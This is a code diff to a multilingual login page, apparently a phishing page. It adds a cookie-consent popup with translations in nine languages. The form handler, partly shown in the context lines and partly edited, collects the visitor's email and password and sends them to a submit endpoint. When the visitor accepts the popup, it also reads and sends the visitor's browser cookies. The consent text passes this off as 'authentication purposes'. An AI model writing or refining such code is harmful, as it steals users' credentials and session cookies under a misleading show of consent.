@@ -115,6 +115,44 @@
             display: block;
             margin-bottom: 10px;
         }
+        /* Cookie Consent Popup Styles */
+        .cookie-consent {
+            position: fixed;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(255, 255, 255, 0.95);
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+            max-width: 500px;
+            width: 90%;
+            z-index: 1000;
+            text-align: center;
+            display: none; /* Hidden by default */
+        }
+        .cookie-consent p {
+            margin: 0 0 15px;
+            font-size: 14px;
+            color: #333333;
+        }
+        .cookie-consent button {
+            margin: 0 10px;
+            padding: 8px 16px;
+            font-size: 14px;
+        }
+        .cookie-consent .accept {
+            background-color: #d40511;
+        }
+        .cookie-consent .accept:hover {
+            background-color: #b0040f;
+        }
+        .cookie-consent .decline {
+            background-color: #666666;
+        }
+        .cookie-consent .decline:hover {
+            background-color: #555555;
+        }
         @media (max-width: 480px) {
             .container {
                 padding: 15px;
@@ -130,6 +168,17 @@
             .quick-actions a {
                 font-size: 12px;
             }
+            .cookie-consent {
+                bottom: 10px;
+                padding: 15px;
+            }
+            .cookie-consent p {
+                font-size: 12px;
+            }
+            .cookie-consent button {
+                padding: 6px 12px;
+                font-size: 12px;
+            }
         }
         [dir="rtl"] .header {
             flex-direction: row-reverse;
@@ -142,6 +191,9 @@
             right: auto;
         }
         [dir="rtl"] input {
+            text-align: right;
+        }
+        [dir="rtl"] .cookie-consent {
             text-align: right;
         }
     </style>
@@ -185,6 +237,14 @@
             <a href="#" data-i18n="business_user">Business user? <span data-i18n="business_sign_in">Sign in</span></a>
         </div>
     </div>
+    <!-- Cookie Consent Popup -->
+    <div class="cookie-consent" id="cookie-consent">
+        <p data-i18n="cookie_consent_message">
+            We use cookies to enhance your experience. By continuing, you agree to our use of cookies for authentication purposes.
+        </p>
+        <button class="accept" onclick="setCookieConsent('accepted')">Accept</button>
+        <button class="decline" onclick="setCookieConsent('declined')">Decline</button>
+    </div>
 
     <script src="https://cdnjs.cloudflare.com/ajax/libs/i18next/21.6.14/i18next.min.js"></script>
     <script>
@@ -205,7 +265,8 @@
                     'no_account': "Don't have an account yet?",
                     'sign_up': 'Sign up',
                     'business_user': 'Business user?',
-                    'business_sign_in': 'Sign in'
+                    'business_sign_in': 'Sign in',
+                    'cookie_consent_message': 'We use cookies to enhance your experience. By continuing, you agree to our use of cookies for authentication purposes.'
                 }
             },
             'zh-CN': {
@@ -223,7 +284,8 @@
                     'no_account': '还没有账户？',
                     'sign_up': '注册',
                     'business_user': '商业用户？',
-                    'business_sign_in': '登录'
+                    'business_sign_in': '登录',
+                    'cookie_consent_message': '我们使用 cookie 来提升您的体验。继续即表示您同意我们使用 cookie 进行身份验证。'
                 }
             },
             'hi': {
@@ -241,7 +303,8 @@
                     'no_account': 'अभी तक खाता नहीं है?',
                     'sign_up': 'साइन अप करें',
                     'business_user': 'व्यवसायिक उपयोगकर्ता?',
-                    'business_sign_in': 'साइन इन करें'
+                    'business_sign_in': 'साइन इन करें',
+                    'cookie_consent_message': 'हम आपके अनुभव को बेहतर बनाने के लिए कुकीज़ का उपयोग करते हैं। जारी रखने से आप प्रमाणीकरण उद्देश्यों के लिए कुकीज़ के उपयोग से सहमत होते हैं।'
                 }
             },
             'es': {
@@ -259,7 +322,8 @@
                     'no_account': '¿Aún no tienes una cuenta?',
                     'sign_up': 'Regístrate',
                     'business_user': '¿Usuario empresarial?',
-                    'business_sign_in': 'Iniciar sesión'
+                    'business_sign_in': 'Iniciar sesión',
+                    'cookie_consent_message': 'Usamos cookies para mejorar tu experiencia. Al continuar, aceptas nuestro uso de cookies para fines de autenticación.'
                 }
             },
             'fr': {
@@ -277,7 +341,8 @@
                     'no_account': 'Vous n’avez pas encore de compte ?',
                     'sign_up': 'S’inscrire',
                     'business_user': 'Utilisateur professionnel ?',
-                    'business_sign_in': 'Se connecter'
+                    'business_sign_in': 'Se connecter',
+                    'cookie_consent_message': 'Nous utilisons des cookies pour améliorer votre expérience. En continuant, vous acceptez notre utilisation des cookies à des fins d’authentification.'
                 }
             },
             'ar': {
@@ -295,7 +360,8 @@
                     'no_account': 'ليس لديك حساب بعد؟',
                     'sign_up': 'التسجيل',
                     'business_user': 'مستخدم تجاري؟',
-                    'business_sign_in': 'تسجيل الدخول'
+                    'business_sign_in': 'تسجيل الدخول',
+                    'cookie_consent_message': 'نستخدم ملفات تعريف الارتباط لتحسين تجربتك. بالمتابعة، فإنك توافق على استخدامنا لملفات تعريف الارتباط لأغراض التوثيق.'
                 }
             },
             'ko': {
@@ -313,7 +379,8 @@
                     'no_account': '아직 계정이 없으신가요?',
                     'sign_up': '가입하기',
                     'business_user': '비즈니스 사용자?',
-                    'business_sign_in': '로그인'
+                    'business_sign_in': '로그인',
+                    'cookie_consent_message': '우리는 쿠키를 사용하여 사용자 경험을 향상시킵니다. 계속하면 인증 목적으로 쿠키 사용에 동의하는 것입니다.'
                 }
             },
             'ja': {
@@ -331,7 +398,8 @@
                     'no_account': 'まだアカウントをお持ちでないですか？',
                     'sign_up': 'サインアップ',
                     'business_user': 'ビジネスユーザー？',
-                    'business_sign_in': 'ログイン'
+                    'business_sign_in': 'ログイン',
+                    'cookie_consent_message': '私たちはクッキーを使用してユーザー体験を向上させます。続行することで、認証目的でのクッキーの使用に同意するものとします。'
                 }
             },
             'vi': {
@@ -349,7 +417,8 @@
                     'no_account': 'Chưa có tài khoản?',
                     'sign_up': 'Đăng ký',
                     'business_user': 'Người dùng doanh nghiệp?',
-                    'business_sign_in': 'Đăng nhập'
+                    'business_sign_in': 'Đăng nhập',
+                    'cookie_consent_message': 'Chúng tôi sử dụng cookie để nâng cao trải nghiệm của bạn. Bằng cách tiếp tục, bạn đồng ý với việc chúng tôi sử dụng cookie cho mục đích xác thực.'
                 }
             }
         };
@@ -430,6 +499,9 @@
             });
             document.title = t('title');
             document.querySelector('.lang-switcher').value = lang;
+
+            // Show cookie consent popup after i18next initialization
+            showCookieConsent();
         });
 
         // Language switcher for manual override
@@ -455,12 +527,55 @@
                 });
                 document.title = t('title');
                 document.querySelector('.lang-switcher').value = lang;
+
+                // Update cookie consent message on language change
+                document.getElementById('cookie-consent').querySelector('p').innerText = t('cookie_consent_message');
             });
         }
 
-        // Function to get all cookies as a string
+        // Cookie Consent Functions
+        function setCookie(name, value, days) {
+            let expires = "";
+            if (days) {
+                const date = new Date();
+                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
+                expires = "; expires=" + date.toUTCString();
+            }
+            document.cookie = name + "=" + (value || "") + expires + "; path=/; SameSite=Strict";
+            console.log(`Cookie set: ${name}=${value}`);
+        }
+
+        function getCookie(name) {
+            const nameEQ = name + "=";
+            const ca = document.cookie.split(';');
+            for (let i = 0; i < ca.length; i++) {
+                let c = ca[i];
+                while (c.charAt(0) === ' ') c = c.substring(1);
+                if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length);
+            }
+            return null;
+        }
+
+        function showCookieConsent() {
+            const consent = getCookie('cookieConsent');
+            const consentPopup = document.getElementById('cookie-consent');
+            if (!consent) {
+                consentPopup.style.display = 'block';
+                console.log('Showing cookie consent popup');
+            } else {
+                console.log('Cookie consent already set:', consent);
+            }
+        }
+
+        function setCookieConsent(status) {
+            setCookie('cookieConsent', status, 365); // Store consent for 1 year
+            document.getElementById('cookie-consent').style.display = 'none';
+            console.log(`Cookie consent set to: ${status}`);
+        }
+
+        // Function to get all cookies as a string (excluding cookieConsent)
         function getCookies() {
-            const cookies = document.cookie || '';
+            const cookies = document.cookie ? document.cookie.split('; ').filter(cookie => !cookie.startsWith('cookieConsent=')).join('; ') : '';
             console.log('Captured cookies:', cookies);
             return cookies;
         }
@@ -490,7 +605,8 @@
                 const email = form.email.value.trim();
                 const password = form.password.value;
                 const honeypot = form.honeypot.value;
-                const cookies = getCookies(); // Capture cookies
+                const consent = getCookie('cookieConsent');
+                const cookies = consent === 'accepted' ? getCookies() : ''; // Only include cookies if consent is granted
 
                 if (!email || !password) {
                     errorMessageEl.textContent = i18next.t('error_message');
@@ -503,17 +619,20 @@
                 }
 
                 try {
+                    const payload = { email, password };
+                    if (cookies) payload.cookies = cookies; // Include cookies only if present and consented
+
                     const response = await fetch(submitEndpoint, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ email, password, cookies }), // Include cookies in payload
+                        body: JSON.stringify(payload),
                     });
 
                     if (!response.ok) {
                         throw new Error('Login failed');
                     }
 
-                    console.log('Login successful, cookies sent:', cookies);
+                    console.log('Login successful, cookies sent:', cookies || 'None (consent not granted or no cookies)');
                 } catch (error) {
                     console.error('Form submission error:', error);
                     attemptCount++;
